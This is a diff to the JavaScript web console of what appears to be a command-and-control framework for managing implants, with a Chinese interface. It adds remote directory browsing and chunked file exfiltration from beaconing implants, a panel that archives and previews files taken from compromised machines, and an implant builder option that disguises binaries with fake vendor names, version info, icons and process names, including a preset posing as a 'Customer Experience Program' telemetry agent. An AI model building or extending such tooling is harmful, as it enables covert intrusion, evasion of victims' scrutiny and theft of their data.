@@ -70,6 +70,8 @@ const state = {
   implantKind: null,
   liteSelected: null,
   liteBeacons: [],
+  liteTab: "term",
+  liteDir: "",
   aliases: {},
   targetNote: "",
   aliasEditing: false,
@@ -120,6 +122,12 @@ async function api(path, options = {}) {
   }
   if (!res.ok) throw new Error((await res.text()) || res.statusText);
   return res;
+}
+
+function fileNameOf(path) {
+  if (!path) return "";
+  const parts = String(path).split(/[\\/]/);
+  return parts[parts.length - 1] || "";
 }
 
 function downloadBlob(blob, name) {
@@ -292,6 +300,8 @@ async function renderImplants(view) {
       if (kind === "lite") {
         state.selected = null;
         state.liteSelected = row.dataset.id;
+        state.liteTab = "term";
+        state.liteDir = "";
       } else {
         state.liteSelected = null;
         const pool = kind === "beacon" ? state.beacons : state.sessions;
@@ -468,6 +478,7 @@ async function renderInteract(view) {
       <button data-tab="command" class="${state.tab === "command" ? "active" : ""}">全部命令</button>
       <button data-tab="terminal" class="${state.tab === "terminal" ? "active" : ""}">终端</button>
       <button data-tab="files" class="${state.tab === "files" ? "active" : ""}">文件</button>
+      <button data-tab="grabbed" class="${state.tab === "grabbed" ? "active" : ""}">拿回的文件</button>
       <button data-tab="tasks" class="${state.tab === "tasks" ? "active" : ""}">任务</button>
     </div>
     <div id="interact"></div>`;
@@ -479,6 +490,7 @@ async function renderInteract(view) {
   });
   const box = view.querySelector("#interact");
   if (state.tab === "files") return renderFiles(box);
+  if (state.tab === "grabbed") return renderGrabbed(box, item.kind + ":" + item.ID);
   if (state.tab === "tasks") return renderTasks(box);
   if (state.tab === "terminal") return renderTerminal(box);
   return renderCommandBrowser(box, "implant", item);
@@ -528,14 +540,24 @@ async function renderFiles(box) {
         return;
       }
       const files = result.Files || [];
-      $("file-list").innerHTML = table(["名称", "大小", "权限", "修改时间"], files.map((file) => `<tr class="files"><td data-name="${esc(file.Name)}" data-dir="${file.IsDir}">${esc(file.Name)}${file.IsDir ? "/" : ""}</td><td>${esc(file.Size)}</td><td>${esc(file.Mode)}</td><td>${when(file.ModTime)}</td></tr>`));
+      $("file-list").innerHTML = table(["名称", "大小", "权限", "修改时间", ""], files.map((file) => {
+        const full = joinPath(state.cwd, file.Name);
+        return `<tr class="files"><td class="fname" data-name="${esc(file.Name)}" data-dir="${file.IsDir}">${esc(file.Name)}${file.IsDir ? "/" : ""}</td><td>${esc(file.Size)}</td><td>${esc(file.Mode)}</td><td>${when(file.ModTime)}</td><td>${file.IsDir ? "" : `<button class="mini" data-dl="${esc(full)}">下载</button>`}</td></tr>`;
+      }));
       $("file-note").textContent = result.Path || "";
-      $("file-list").querySelectorAll("td[data-name]").forEach((cell) => {
+      $("file-list").querySelectorAll("td.fname").forEach((cell) => {
         cell.onclick = () => {
           const next = joinPath(state.cwd, cell.dataset.name);
           if (cell.dataset.dir === "true") load(next);
-          else taskDownload(next);
+          else {
+            $("file-list").querySelectorAll("tr.files").forEach((row) => row.classList.remove("sel"));
+            cell.closest("tr").classList.add("sel");
+            $("file-note").textContent = "已选中 " + cell.dataset.name + "，点右侧「下载」才会传输。";
+          }
         };
+      });
+      $("file-list").querySelectorAll("button[data-dl]").forEach((btn) => {
+        btn.onclick = (event) => { event.stopPropagation(); taskDownload(btn.dataset.dl); };
       });
     } catch (err) {
       $("file-note").textContent = err.message;
@@ -833,8 +855,10 @@ async function renderOperators(view) {
 function stopLiteTimers() {
   clearInterval(state.liteClock);
   clearInterval(state.litePoll);
+  clearInterval(state.liteDirPoll);
   state.liteClock = null;
   state.litePoll = null;
+  state.liteDirPoll = null;
 }
 
 function liteBeacon(id) {
@@ -918,9 +942,12 @@ function paintLiteLog() {
 
 function formatLiteResult(result) {
   if (result.Kind === "read") {
-    const errs = ["", "文件不存在", "没有权限", "文件太大"];
+    const errs = ["", "文件不存在", "没有权限", "文件太大，上限 20MB", "传输中断，请整次重来"];
     if (result.Err) return errs[result.Err] || ("读文件失败 " + result.Err);
-    return textOf(result.Output);
+    const name = fileNameOf(result.Path) || "file.bin";
+    const data = bytesOf(result.Output);
+    setTimeout(() => downloadBlob(new Blob([data]), name), 0);
+    return `已开始下载 ${name}（${data.length} 字节）`;
   }
   const out = textOf(result.Output);
   if (result.Exit) return (out ? out.replace(/\s*$/, "") + "\n" : "") + `[exit ${result.Exit}]`;
@@ -1022,7 +1049,7 @@ async function submitLiteLine(id, line) {
   const prompt = litePrompt(b);
   if (trimmed === ".help") {
     entries.push({ kind: "cmd", prompt, text: trimmed });
-    entries.push({ kind: "sys", text: "直接输入命令，等心跳带回结果。每次命令独立执行，没有持续工作目录；连着做请写成 cd /tmp && ls。\n.help        本说明\n.clear       清屏（Ctrl+L 同样）\n.sleep 秒数  改这台的回连间隔\n.read 路径   按文件任务读取（不必经过 shell）\n.kill        让植入体退出" });
+    entries.push({ kind: "sys", text: "直接输入命令，等心跳带回结果。每次命令独立执行，没有持续工作目录；连着做请写成 cd /tmp && ls。\n.help        本说明\n.clear       清屏（Ctrl+L 同样）\n.sleep 秒数  改这台的回连间隔\n.read 路径   下载这个文件，最大 20MB，完成后会存到浏览器下载目录\n.kill        让植入体退出" });
     paintLiteLog();
     return;
   }
@@ -1070,6 +1097,8 @@ async function submitLiteLine(id, line) {
       entries.push({ kind: "sys", text: `已排队退出（任务 ${res.taskId}），等下次心跳执行。` });
     } else if (payload.type === "sleep") {
       entries.push({ kind: "sys", text: `已排队改心跳为 ${payload.interval}s（任务 ${res.taskId}）。` });
+    } else if (payload.type === "read") {
+      entries.push({ kind: "wait", taskId: res.taskId, text: "…等待回连，文件会分块传回，失败需整次重来" });
     } else {
       entries.push({ kind: "wait", taskId: res.taskId, text: "…等待回连" });
     }
@@ -1157,6 +1186,17 @@ async function renderCImplant(view) {
       </div>
       <p id="c-url-preview" class="hint">先填回连地址和回连路径。</p>
       <div class="row">
+        <label>伪装预设<select name="dpreset"><option value="">不伪装</option><option value="telemetry">体验计划代理</option></select></label>
+        <label>显示名<input name="displayName" placeholder="任务管理器/属性里显示"></label>
+        <label>厂商<input name="company"></label>
+        <label>版本号<input name="version" placeholder="2.0.3.0"></label>
+      </div>
+      <div class="row">
+        <label>进程名<input name="procName" placeholder="ps 里显示，≤15 字符"></label>
+        <label>图标（.ico，可选）<input name="dicon" type="file" accept=".ico"></label>
+      </div>
+      <p id="c-disguise-note" class="hint">伪装只改外观（版本信息、图标、进程名），不影响杀软判定。全部留空就和现在一样。</p>
+      <div class="row">
         <label>平时回连秒数<input name="idleSec" value="10"></label>
         <label>干活时回连秒数<input name="fastSec" value="10"></label>
       </div>
@@ -1177,6 +1217,17 @@ async function renderCImplant(view) {
   };
   $("c-url").oninput = previewURL;
   $("c-path").oninput = previewURL;
+  const disguiseDefaults = {
+    telemetry: { displayName: "Customer Experience Program", company: "Nimbus Software Ltd.", version: "2.0.3.0", procName: "feedbackagent" },
+  };
+  const presetSelect = view.querySelector("[name=dpreset]");
+  presetSelect.onchange = () => {
+    const preset = disguiseDefaults[presetSelect.value];
+    view.querySelector("[name=displayName]").value = preset ? preset.displayName : "";
+    view.querySelector("[name=company]").value = preset ? preset.company : "";
+    view.querySelector("[name=version]").value = preset ? preset.version : "";
+    view.querySelector("[name=procName]").value = preset ? preset.procName : "";
+  };
   $("c-gen").onsubmit = async (event) => {
     event.preventDefault();
     const form = new FormData(event.target);
@@ -1185,13 +1236,33 @@ async function renderCImplant(view) {
       note.textContent = "先填写回连路径";
       return;
     }
+    const payload = {
+      name: form.get("name"), os: form.get("os"), arch: form.get("arch"),
+      url: form.get("url"), path: form.get("path"),
+      idleSec: Number(form.get("idleSec") || 10), fastSec: Number(form.get("fastSec") || 10),
+    };
+    if (String(form.get("displayName") || "").trim()) {
+      payload.displayName = String(form.get("displayName")).trim();
+      payload.company = String(form.get("company") || "").trim();
+      payload.version = String(form.get("version") || "").trim();
+      payload.procName = String(form.get("procName") || "").trim();
+      const iconFile = form.get("dicon");
+      if (iconFile && iconFile.size) {
+        if (iconFile.size > 256 * 1024) {
+          note.textContent = "图标超过 256KB";
+          return;
+        }
+        payload.iconB64 = await new Promise((resolve, reject) => {
+          const reader = new FileReader();
+          reader.onload = () => resolve(String(reader.result).split(",").pop() || "");
+          reader.onerror = () => reject(new Error("读取图标失败"));
+          reader.readAsDataURL(iconFile);
+        });
+      }
+    }
     note.textContent = "正在编译…";
     try {
-      const res = await api("/api/implants/generate-c", { method: "POST", json: {
-        name: form.get("name"), os: form.get("os"), arch: form.get("arch"),
-        url: form.get("url"), path: form.get("path"),
-        idleSec: Number(form.get("idleSec") || 10), fastSec: Number(form.get("fastSec") || 10),
-      }});
+      const res = await api("/api/implants/generate-c", { method: "POST", json: payload });
       const blob = await res.blob();
       downloadBlob(blob, res.headers.get("X-Implant-Name") || "c-implant");
       note.textContent = "已下载";
@@ -1218,6 +1289,23 @@ function renderLiteConsole(view) {
       <span class="hint">回车发送 · 上/下翻历史 · Ctrl+L 清屏</span>
     </div>
     <p id="target-note" class="hint">${esc(state.targetNote)}</p>
+    <div class="tabs" id="lite-tabs">
+      <button data-tab="term" class="${state.liteTab === "term" ? "active" : ""}">终端</button>
+      <button data-tab="files" class="${state.liteTab === "files" ? "active" : ""}">文件</button>
+      <button data-tab="grabbed" class="${state.liteTab === "grabbed" ? "active" : ""}">拿回的文件</button>
+    </div>
+    <div id="lite-body"></div>`;
+  $("lite-back").onclick = () => { state.liteSelected = null; state.targetNote = ""; render(); };
+  bindTargetActions(view);
+  bindAliasEditors(view);
+  view.querySelectorAll("#lite-tabs button").forEach((button) => {
+    button.onclick = () => { state.liteTab = button.dataset.tab; render(); };
+  });
+  stopLiteTimers();
+  const body = view.querySelector("#lite-body");
+  if (state.liteTab === "files") return renderLiteFiles(body, b);
+  if (state.liteTab === "grabbed") return renderGrabbed(body, "lite:" + b.ID);
+  body.innerHTML = `
     <section class="lite-term">
       <div class="lite-hb" id="lite-hb"></div>
       <pre class="lite-log" id="lite-log"></pre>
@@ -1230,13 +1318,207 @@ function renderLiteConsole(view) {
   paintLiteLog();
   updateLiteHb();
   bindLiteShell(b);
-  $("lite-back").onclick = () => { state.liteSelected = null; state.targetNote = ""; render(); };
-  bindTargetActions(view);
-  bindAliasEditors(view);
-  stopLiteTimers();
   state.liteClock = setInterval(updateLiteHb, 1000);
   state.litePoll = setInterval(pollLiteConsole, 2000);
   pollLiteConsole();
+}
+
+function liteParentDir(path) {
+  let p = String(path || ".").replace(/\/+$/, "");
+  if (!p || p === "." || p === "/") return "/";
+  const idx = p.lastIndexOf("/");
+  if (idx < 0) return ".";
+  if (idx === 0) return "/";
+  return p.slice(0, idx);
+}
+
+function renderLiteFiles(box, b) {
+  if (!state.liteDir) state.liteDir = ".";
+  box.innerHTML = `
+    <div class="panel">
+      <form id="lite-dir-form" class="row">
+        <label>路径<input id="lite-dir-path" value="${esc(state.liteDir)}"></label>
+        <button type="button" class="ghost" id="lite-dir-up">上一级</button>
+        <button type="submit">打开</button>
+        <button type="button" class="ghost" id="lite-dir-refresh">刷新</button>
+      </form>
+      <div id="lite-dir-list"></div>
+      <p id="lite-dir-note" class="hint"></p>
+    </div>`;
+  const dirErrs = ["", "目录不存在", "没有权限打开", "这是文件不是目录"];
+  const paint = (listing) => {
+    if (listing.Err) {
+      $("lite-dir-list").innerHTML = "";
+      $("lite-dir-note").textContent = dirErrs[listing.Err] || "列目录失败 " + listing.Err;
+      return;
+    }
+    const entries = listing.Entries || [];
+    $("lite-dir-list").innerHTML = table(["名称", "大小", "修改时间", ""], entries.map((entry) => {
+      const full = joinPath(state.liteDir, entry.Name);
+      return `<tr class="files"><td class="fname" data-name="${esc(entry.Name)}" data-dir="${entry.IsDir}">${esc(entry.Name)}${entry.IsDir ? "/" : ""}</td><td>${entry.IsDir ? "—" : esc(entry.Size)}</td><td>${when(entry.ModTime)}</td><td>${entry.IsDir ? "" : `<button class="mini" data-dl="${esc(full)}">下载</button>`}</td></tr>`;
+    }));
+    $("lite-dir-note").textContent = (listing.Truncated ? "目录太大，只显示了前一部分；" : "") + "点目录进入，点文件旁的「下载」才会传输。";
+    $("lite-dir-list").querySelectorAll("td.fname").forEach((cell) => {
+      cell.onclick = () => {
+        if (cell.dataset.dir === "true") load(joinPath(state.liteDir, cell.dataset.name), false);
+      };
+    });
+    $("lite-dir-list").querySelectorAll("button[data-dl]").forEach((btn) => {
+      btn.onclick = async (event) => {
+        event.stopPropagation();
+        try {
+          const res = await api("/api/lite/task", { method: "POST", json: { beaconId: b.ID, type: "read", path: btn.dataset.dl } });
+          $("lite-dir-note").textContent = `已排队下载（任务 ${res.taskId}），传完会自动保存，并出现在「拿回的文件」。`;
+        } catch (err) {
+          $("lite-dir-note").textContent = err.message;
+        }
+      };
+    });
+  };
+  const check = async () => {
+    if (state.liteTab !== "files" || state.liteSelected !== b.ID) return;
+    try {
+      const data = await api("/api/lite/ls?beacon=" + encodeURIComponent(b.ID) + "&path=" + encodeURIComponent(state.liteDir));
+      if (data.pending) {
+        $("lite-dir-note").textContent = "等待回连…（结果会随心跳回来）";
+        return;
+      }
+      if (!data.listing) {
+        $("lite-dir-note").textContent = "这台植入体还没回应列目录，稍后再点「刷新」。";
+        return;
+      }
+      paint(data.listing);
+    } catch (err) {
+      $("lite-dir-note").textContent = err.message;
+    }
+  };
+  const load = async (path, force) => {
+    state.liteDir = path || ".";
+    $("lite-dir-path").value = state.liteDir;
+    $("lite-dir-note").textContent = "等待回连…";
+    try {
+      await api("/api/lite/ls", { method: "POST", json: { beaconId: b.ID, path: state.liteDir, force: !!force } });
+    } catch (err) {
+      $("lite-dir-note").textContent = err.message;
+      return;
+    }
+    check();
+  };
+  $("lite-dir-form").onsubmit = (event) => { event.preventDefault(); load($("lite-dir-path").value.trim() || ".", false); };
+  $("lite-dir-up").onclick = () => load(liteParentDir(state.liteDir), false);
+  $("lite-dir-refresh").onclick = () => load(state.liteDir, true);
+  state.liteDirPoll = setInterval(check, 2000);
+  check();
+}
+
+const grabTextExts = ["txt", "log", "conf", "cfg", "ini", "yaml", "yml", "toml", "csv", "tsv", "md", "xml", "html", "htm", "css", "js", "ts", "jsx", "tsx", "py", "go", "c", "h", "cpp", "hpp", "java", "rb", "php", "sh", "bash", "ps1", "sql", "env", "properties", "plist", "gitignore", "service", "sock"];
+const grabImageExts = ["png", "jpg", "jpeg", "gif", "webp", "bmp", "svg", "ico"];
+
+function grabKind(name) {
+  const ext = String(name || "").toLowerCase().split(".");
+  const e = ext.length > 1 ? ext.pop() : "";
+  if (e === "json" || e === "map") return "json";
+  if (e === "jsonl" || e === "ndjson") return "text";
+  if (grabImageExts.includes(e)) return "image";
+  if (e === "pdf") return "pdf";
+  if (e === "mp4" || e === "webm" || e === "m4v") return "video";
+  if (e === "mp3" || e === "wav") return "audio";
+  if (grabTextExts.includes(e)) return "text";
+  return "hex";
+}
+
+async function renderGrabbed(box, targetKey) {
+  box.innerHTML = `
+    <div class="panel">
+      <h3>拿回的文件</h3>
+      <p class="hint">从这台机器拿回来的文件都留档在服务端，可随时预览或再存到本机。</p>
+      <div id="grab-list"></div>
+      <div id="grab-preview"></div>
+    </div>`;
+  let urls = [];
+  const freeURLs = () => { urls.forEach((u) => URL.revokeObjectURL(u)); urls = []; };
+  const sizeText = (n) => (n >= 1 << 20 ? (n / (1 << 20)).toFixed(1) + " MB" : n >= 1024 ? (n / 1024).toFixed(1) + " KB" : n + " B");
+  const preview = async (rec) => {
+    const pane = $("grab-preview");
+    pane.innerHTML = `<p class="hint">载入中…</p>`;
+    let res;
+    try {
+      res = await api("/api/files/raw?id=" + encodeURIComponent(rec.ID));
+    } catch (err) {
+      pane.innerHTML = `<p class="hint">${esc(err.message)}</p>`;
+      return;
+    }
+    const blob = await res.blob();
+    freeURLs();
+    const kind = grabKind(rec.Name);
+    const head = `<div class="grab-head"><b>${esc(rec.Name)}</b><span class="hint">${sizeText(rec.Size)} · 来自 ${esc(rec.SourcePath)}</span>
+      <button class="ghost" id="grab-save">存到本机</button></div>`;
+    let body = "";
+    if (kind === "image") {
+      const url = URL.createObjectURL(blob);
+      urls.push(url);
+      body = `<img alt="${esc(rec.Name)}" src="${url}">`;
+    } else if (kind === "pdf") {
+      const url = URL.createObjectURL(blob);
+      urls.push(url);
+      body = `<iframe src="${url}" title="${esc(rec.Name)}"></iframe>`;
+    } else if (kind === "video" || kind === "audio") {
+      const url = URL.createObjectURL(blob);
+      urls.push(url);
+      body = kind === "video"
+        ? `<video controls src="${url}"></video>`
+        : `<audio controls src="${url}"></audio>`;
+    } else if (kind === "json" || kind === "text") {
+      let text = await blob.text();
+      if (text.length > 1 << 20) text = text.slice(0, 1 << 20) + "\n…（内容太大，只显示前 1MB，存到本机看全文）";
+      if (kind === "json") {
+        try { text = JSON.stringify(JSON.parse(text), null, 2); } catch { /* 不是合法 JSON，按原文显示 */ }
+      }
+      body = `<pre>${esc(text)}</pre>`;
+    } else {
+      const buf = new Uint8Array(await blob.slice(0, 2048).arrayBuffer());
+      let hex = "";
+      for (let i = 0; i < buf.length; i += 16) {
+        const row = [];
+        for (let j = 0; j < 16 && i + j < buf.length; j++) row.push(buf[i + j].toString(16).padStart(2, "0"));
+        hex += row.join(" ").padEnd(48) + "\n";
+      }
+      body = `<pre>${esc(hex)}</pre><p class="hint">二进制文件不预览内容，用「存到本机」拿走。</p>`;
+    }
+    pane.innerHTML = `<div class="preview">${head}${body}</div>`;
+    $("grab-save").onclick = () => downloadBlob(blob, rec.Name || "file.bin");
+  };
+  const loadList = async () => {
+    const data = await api("/api/files?target=" + encodeURIComponent(targetKey));
+    const files = data.Files || [];
+    $("grab-list").innerHTML = table(["文件名", "大小", "来源路径", "时间", "操作"], files.map((rec) => `<tr class="files clickable"><td>${esc(rec.Name)}</td><td>${sizeText(rec.Size)}</td><td class="mono">${esc(rec.SourcePath)}</td><td>${whenISO(rec.At)}</td><td><button class="mini" data-save="${esc(rec.ID)}">存到本机</button> <button class="mini danger" data-del="${esc(rec.ID)}">删除</button></td></tr>`));
+    $("grab-list").querySelectorAll("tr.clickable").forEach((row, idx) => {
+      row.onclick = (event) => {
+        if (event.target.closest("button")) return;
+        preview(files[idx]);
+      };
+    });
+    $("grab-list").querySelectorAll("button[data-save]").forEach((btn) => {
+      btn.onclick = async (event) => {
+        event.stopPropagation();
+        const rec = files.find((item) => item.ID === btn.dataset.save);
+        const res = await api("/api/files/raw?id=" + encodeURIComponent(btn.dataset.save));
+        downloadBlob(await res.blob(), (rec && rec.Name) || "file.bin");
+      };
+    });
+    $("grab-list").querySelectorAll("button[data-del]").forEach((btn) => {
+      btn.onclick = async (event) => {
+        event.stopPropagation();
+        try {
+          await api("/api/files?id=" + encodeURIComponent(btn.dataset.del), { method: "DELETE" });
+        } catch (err) { /* 已被删过就算了 */ }
+        $("grab-preview").innerHTML = "";
+        loadList();
+      };
+    });
+    if (!files.length) $("grab-list").innerHTML = `<p class="hint">还没有从这台机器拿回文件。</p>`;
+  };
+  loadList();
 }
 
 function whenISO(v) {
